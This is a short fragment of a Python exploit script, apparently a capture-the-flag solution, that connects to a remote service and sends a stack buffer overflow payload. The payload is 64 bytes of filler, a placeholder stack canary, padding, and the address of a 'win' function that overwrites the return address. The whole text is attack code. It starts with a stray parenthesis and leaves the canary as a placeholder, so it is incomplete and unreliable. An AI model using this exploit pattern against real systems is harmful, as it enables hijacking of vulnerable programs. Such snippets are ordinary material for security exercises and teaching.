conn = remote(host, port)

)
buffer_size = 64
canary = "AAAA"  # Replace with the actual canary value
win_address = p32(0x5655625d)  # p32 converts the address to little-endian


payload = b"A" * buffer_size  # Fill the buffer
payload += canary.encode()    # Add the canary
payload += b"B" * 4           # Padding between the canary and the return address
payload += win_address        # Overwrite the return address with the win function address

# Send the payload
conn.sendline(payload)
